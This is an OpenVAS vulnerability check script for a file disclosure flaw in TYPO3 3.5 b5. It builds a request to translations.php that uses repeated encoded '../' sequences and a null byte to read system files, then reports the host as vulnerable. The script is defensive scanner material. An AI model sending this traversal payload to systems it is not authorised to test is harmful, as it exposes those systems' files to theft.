###############################################################################
# OpenVAS Vulnerability Test
# $Id: sw_typo3_translations_php_file_disclosure.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# TYPO3 Translations.php File Disclosure Vulnerability
#
# Authors:
# Christian Fischer <info@schutzwerk.com>
#
# Copyright:
# Copyright (c) 2014 SCHUTZWERK GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (c) the respective author(s)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105141");
  script_version("$Revision: 11867 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-12-12 12:00:00 +0100 (Fri, 12 Dec 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(6985);
  script_name("TYPO3 Translations.php File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2014 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_typo3_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("TYPO3/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"This host is installed with TYPO3 and
  is prone to a file disclosure vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and
  check whether it is able to get sensitive information.");
  script_tag(name:"insight", value:"TYPO3 does not sufficiently sanitize
  input submitted via URI parameters of potentially malicious data.
  This issue exists in the translations.php script.");
  script_tag(name:"impact", value:"By submitting a malicious web request
  to this script that contains a relative path to a resource and a null
  character (%00), it is possible to retrieve arbitrary files that are
  readable by the web server process.");
  script_tag(name:"affected", value:"TYPO3 3.5 b5");
  script_tag(name:"solution", value:"Upgrade to TYPO3 version 3.5.0 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/6985");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/313488");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://typo3.org/");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();
foreach file( keys( files ) ) {
  url = dir + '/typo3/dev/translations.php?ONLY=' +  crap( data:"%2e%2e/", length:119 ) + files[file]  +'%00';
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
